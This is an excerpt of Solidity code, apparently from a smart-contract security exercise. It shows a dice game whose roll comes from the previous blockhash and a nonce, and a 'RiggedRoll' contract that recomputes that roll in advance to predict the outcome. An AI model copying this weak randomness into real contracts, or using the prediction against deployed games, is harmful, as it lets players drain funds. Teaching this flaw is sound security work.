...
contract DiceGame {
    uint public nonce = 0;
    uint public prize = 0;
    event Roll(address indexed player, uint roll);
    event Winner(address winner, uint roll);
    ...
    function rollTheDice() public payable {
        require(msg.value >= 0.002 ether, "Failed to send enough ETH");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(this), nonce)
        );
        uint roll = uint(hash) % 16;
...
contract RiggedRoll is Ownable {
    ...
    constructor(address payable diceGameAddress) {
        ...
        gameAddress = diceGameAddress;
    }

    function riggedRoll() public payable {
        require(
            address(this).balance >= 0.002 ether,
            "Failed to send enought ETH"
        );

        nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, gameAddress, nonce)
        );
        uint roll = uint(hash) % 16;
    ...
    function withdraw(address _addr, uint _amount) public payable onlyOwner {
